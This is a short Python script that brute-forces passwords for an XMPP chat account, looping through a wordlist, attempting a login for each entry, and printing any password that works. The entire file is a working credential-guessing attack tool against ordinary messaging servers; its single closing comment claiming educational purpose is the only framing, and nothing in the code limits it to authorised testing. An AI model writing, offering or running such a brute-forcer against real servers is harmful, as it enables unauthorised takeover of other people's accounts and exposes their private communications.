from time import sleep
from xmpp import protocol, client
import sys

# Define colors for output
W = '\033[0m'  # white (normal)
R = '\033[31m'  # red
G = '\033[32m'  # green
O = '\033[33m'  # orange

def xmpp_bruteforce(address, port, username, wordlist, delay):
    xmpp_user = f"{username}@{address}"
    
    with open(wordlist, 'r') as wl:
        for line in wl:
            password = line.strip()
            try:
                jid = protocol.JID(xmpp_user)
                client_instance = client.Client(jid.getDomain(), debug=[])
                client_instance.connect(server=(address, port))
                if client_instance.auth(jid.getNode(), password):
                    client_instance.sendInitPresence()
                    print(f"{G}[*] Username: {username} | [*] Password found: {password}\n{W}")
                    client_instance.disconnect()
                    sys.exit()
                else:
                    print(f"{O}[*] Username: {username} | [*] Password: {password} | Incorrect!\n{W}")
                    sleep(delay)
            except Exception as e:
                print(f"{R}[!] An unexpected error occurred: {e}{W}")
                break  # Exit on error

# Note: This script is for educational purposes only.
